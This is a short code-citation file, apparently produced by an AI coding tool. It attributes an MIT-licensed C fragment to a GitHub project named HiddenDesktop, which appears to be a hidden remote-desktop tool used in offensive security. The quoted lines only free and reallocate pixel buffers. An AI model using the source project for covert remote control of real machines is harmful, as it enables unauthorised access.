# Code Citations

## License: MIT
https://github.com/WKL-Sec/HiddenDesktop/blob/14252f58e3f5379301f0d6334f92f8b96f321a16/client/scmain.c

```
pApi->msvcrt.free( pArgs->pPixels );
        pArgs->pApi->msvcrt.free( pArgs->pOldPixels );
        pArgs->pApi->msvcrt.free( pArgs->pTempPixels );

        pArgs->pPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );
        pArgs->pOldPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );
        pArgs->pTempPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );

        comparePixels = FALSE;
```

